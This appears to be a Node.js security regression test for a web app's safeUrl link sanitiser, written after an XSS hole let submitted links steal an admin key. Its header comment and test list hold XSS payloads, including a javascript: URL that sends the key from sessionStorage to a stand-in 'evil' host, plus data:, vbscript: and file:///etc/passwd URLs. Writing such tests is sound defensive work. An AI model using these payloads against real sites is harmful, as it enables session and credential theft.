#!/usr/bin/env node
/**
 * esc() escapes HTML. It does NOT restrict a URL's SCHEME — and
 * `javascript:fetch('//evil/'+sessionStorage.getItem('clkn_jvp_admin_key'))` contains none of
 * & < > " ' so it passes through esc() byte-for-byte.
 *
 * jupverify-admin.html rendered a PUBLIC, unauthenticated submitter's Website / Icon / Telegram
 * fields as live anchors, in a page that keeps the JVP admin key in sessionStorage. One operator
 * click on that link hands the key over.
 *
 * autopsy.html had solved this for itself with a private safeUrl() and nothing else got it — the
 * "check every form, not one form" trap. safeUrl now lives in cluck-util.js, so this asserts both
 * the helper's behaviour AND that the pages actually route their hrefs through it.
 */
const fs = require('fs');
const path = require('path');
const vm = require('vm');

let failures = 0;
const ok = (n, c, d) => { if (c) console.log('  ✓ ' + n); else { failures++; console.log('  ✗ ' + n + (d ? '\n      ' + d : '')); } };

const ROOT = path.join(__dirname, '..');
const utilSrc = fs.readFileSync(path.join(ROOT, 'public', 'cluck-util.js'), 'utf8');

// Load the real shared module the way a browser would.
const sandbox = { window: {}, navigator: {}, document: { createElement: () => ({ style: {} }) }, console };
sandbox.globalThis = sandbox;
vm.createContext(sandbox);
vm.runInContext(utilSrc, sandbox);
const U = sandbox.CluckUtil;

console.log('\nsafeUrl — the scheme check esc() never did\n');
ok('cluck-util exports safeUrl', typeof U.safeUrl === 'function');
// Keep going even when it is absent, so the page-level assertions below still report rather than
// the harness dying on the first TypeError — a mutation run needs to see ALL the damage.
if (typeof U.safeUrl !== 'function') U.safeUrl = () => '(missing)';

const dangerous = [
  "javascript:fetch('//evil/'+sessionStorage.getItem('clkn_jvp_admin_key'))",
  'javascript:alert(1)',
  'JaVaScRiPt:alert(1)',
  '  javascript:alert(1)  ',
  'data:text/html,<script>alert(1)</script>',
  'vbscript:msgbox(1)',
  'file:///etc/passwd',
  '//evil.example.com/x',          // scheme-relative — inherits the page's scheme
  '',
  null,
  undefined,
];
for (const u of dangerous) ok(`refuses ${JSON.stringify(u)}`, U.safeUrl(u) === '#', 'got ' + JSON.stringify(U.safeUrl(u)));

// WHY esc() IS NOT ENOUGH — stated precisely, because the loose version of this claim is wrong.
// esc() DOES escape the single quotes in the payload above. That does not save you: inside an
// href the HTML parser decodes &#39; back to ' before the URL is ever used, so the script runs
// exactly as written. And a payload with no quotes at all passes through completely untouched.
ok('esc() never touches the SCHEME — the escaped payload is still a javascript: URL',
   /^javascript:/i.test(U.esc(dangerous[0])), U.esc(dangerous[0]).slice(0, 60));
ok('a quote-free payload passes esc() byte-for-byte',
   U.esc('javascript:alert(document.domain)') === 'javascript:alert(document.domain)');
ok('...and safeUrl refuses that one too', U.safeUrl('javascript:alert(document.domain)') === '#');

const safe = ['https://example.com/a?b=c', 'http://example.com', 'HTTPS://EXAMPLE.COM/x'];
for (const u of safe) ok(`allows ${u}`, U.safeUrl(u) !== '#', 'got ' + U.safeUrl(u));
ok('and escapes quotes so it cannot break out of the attribute',
   U.safeUrl('https://e.com/"onmouseover="alert(1)').indexOf('"') === -1,
   U.safeUrl('https://e.com/"onmouseover="alert(1)'));

console.log('\npages route their hrefs through it\n');
const jv = fs.readFileSync(path.join(ROOT, 'public', 'jupverify-admin.html'), 'utf8');
for (const f of ['website', 'iconUrl', 'telegramUrl']) {
  ok(`jupverify-admin: ${f} href uses safeUrl, not esc`,
     jv.includes(`href="'+safeUrl(s.${f})`) && !jv.includes(`href="'+esc(s.${f})`));
}
ok('jupverify-admin binds the SHARED safeUrl', /safeUrl\s*=\s*CluckUtil\.safeUrl/.test(jv));

const ap = fs.readFileSync(path.join(ROOT, 'public', 'autopsy.html'), 'utf8');
ok('autopsy uses the shared safeUrl rather than its own copy',
   /safeUrl\s*=\s*CluckUtil\.safeUrl/.test(ap) && !/function safeUrl\(u\)\s*\{/.test(ap),
   'a private copy is still defined — that is how jupverify-admin missed out');

const bd = fs.readFileSync(path.join(ROOT, 'public', 'buyspecial-dashboard.html'), 'utf8');
ok('buyspecial-dashboard escapes tokenSymbol everywhere it reaches innerHTML',
   !/\+\(curCampaign\.tokenSymbol\|\|'tokens'\)/.test(bd),
   'an unescaped curCampaign.tokenSymbol remains');

console.log('\n' + (failures ? failures + ' FAILED' : 'all passed') + '\n');
process.exit(failures ? 1 : 0);
